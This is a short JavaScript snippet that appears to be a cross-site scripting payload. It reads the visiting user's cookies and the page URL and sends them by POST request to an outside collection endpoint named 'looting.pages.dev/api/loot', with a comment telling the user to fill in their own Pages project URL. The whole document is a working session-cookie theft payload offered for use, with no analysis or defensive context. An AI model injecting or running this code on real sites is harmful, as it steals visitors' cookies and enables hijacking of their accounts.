(function() {
    const data = {
        cookies: document.cookie || "None (HttpOnly?)",
        url: window.location.href
    };

    // Use the FULL URL of your Pages project
    fetch("https://looting.pages.dev/api/loot", {
        method: "POST",
        mode: "cors", // Explicitly ask for CORS
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    });
})();
